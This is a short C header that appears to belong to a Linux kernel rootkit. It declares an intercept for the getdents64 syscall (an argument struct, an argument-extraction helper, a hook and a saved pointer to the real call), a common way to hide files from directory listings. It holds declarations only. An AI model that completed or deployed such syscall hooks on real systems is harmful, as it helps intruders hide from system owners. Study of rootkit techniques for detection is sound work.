#ifndef RK_HOOKS_GETDENTS64_H
#define RK_HOOKS_GETDENTS64_H

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

struct getdents64_args {
    unsigned int fd;
    struct linux_dirent64 __user * dirent;
    unsigned int count;
};

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

struct getdents64_args explode_getdents64_args(const struct pt_regs *regs);

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

extern asmlinkage long hook_getdents64(const struct pt_regs *regs);
extern asmlinkage long (*real_getdents64)(const struct pt_regs *);

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#endif // RK_HOOKS_GETDENTS64_H
